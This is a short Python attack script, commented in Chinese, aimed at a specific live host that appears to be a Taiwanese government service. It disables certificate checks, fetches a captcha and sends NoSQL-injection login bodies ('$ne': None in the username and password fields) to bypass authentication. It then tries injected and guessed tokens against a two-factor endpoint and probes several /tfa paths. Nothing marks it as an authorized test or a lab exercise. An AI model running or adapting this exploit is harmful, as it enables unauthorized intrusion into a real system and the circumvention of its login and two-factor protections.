import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"

# 完整流程: captcha -> login($ne 多文档) -> 看 403 后是否有 session/tfa 线索
s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
print("=== 完整登录流程 (多文档 $ne) ===")
r=s.get(BASE+"/captcha",timeout=12)
print(f"captcha: {r.status_code}, cookies={dict(s.cookies)}")
r=s.post(BASE+"/login",json={"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"},timeout=12)
print(f"login: {r.status_code} | {r.text[:120]}")
print(f"  headers: set-cookie={r.headers.get('Set-Cookie')}, loc={r.headers.get('Location')}")

# 试 2FA 相关: 用 $ne 拿到的(假设)userToken
print("\n=== 尝试 /login2FA 各种参数 ===")
for body in [
  {"userToken":"test","domain":"AUTH_SERVER"},
  {"token":"test","domain":"AUTH_SERVER"},
  {"userToken":"$ne","domain":"AUTH_SERVER"},
  {"userToken":None,"domain":"AUTH_SERVER","username":{"$ne":None}},
]:
    r2=s.post(BASE+"/login2FA",json=body,timeout=12)
    print(f"  {str(body)[:45]:45s} -> {r2.status_code} | {r2.text[:50]}")
    time.sleep(0.1)

# /tfa 端点
print("\n=== /tfa 端点 ===")
for p in ["/tfa/register","/tfa/requestOtp","/tfa/verify","/tfa"]:
    for m in ["GET","POST"]:
        try:
            if m=="GET": r3=s.get(BASE+p,timeout=8)
            else: r3=s.post(BASE+p,json={},timeout=8)
            print(f"  {m} {p:18s} -> {r3.status_code} | {r3.text[:45]}")
        except Exception as e:
            print(f"  {m} {p:18s} -> ERR {repr(e)[:35]}")
print("DONE")
